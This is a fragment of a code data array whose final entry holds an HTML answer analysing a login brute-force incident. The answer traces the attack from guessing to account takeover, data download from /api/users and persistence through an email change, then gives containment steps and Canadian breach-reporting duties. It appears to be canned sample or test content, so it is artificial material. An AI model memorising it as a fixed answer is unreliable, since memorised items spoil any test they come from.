    answer: `<ol><li><strong>Brute force</strong> (03:12 to 03:18): about 4,800 failed logins from one IP with no rate limit.</li><li><strong>Account takeover</strong> (03:18:22): a password guess for <code>t.nguyen</code> worked.</li><li><strong>Data theft</strong> (03:18 to 03:21): every page of <code>/api/users</code> was downloaded, so the user list was exposed, which also means this account could see far more than it should have.</li><li><strong>Persistence</strong> (03:21:30): the account's email was changed so the attacker can keep control through password resets.</li></ol><p><strong>First:</strong> contain it. Lock <code>t.nguyen</code>, end all its sessions, revert the email change, and block the IP. Then preserve the logs, work out exactly what data was taken, fix the gaps (rate limiting, 2FA, access control on <code>/api/users</code>), and follow your breach-reporting duties: in Canada, PIPEDA requires reporting breaches that pose a real risk of significant harm.</p>`,
  },
];
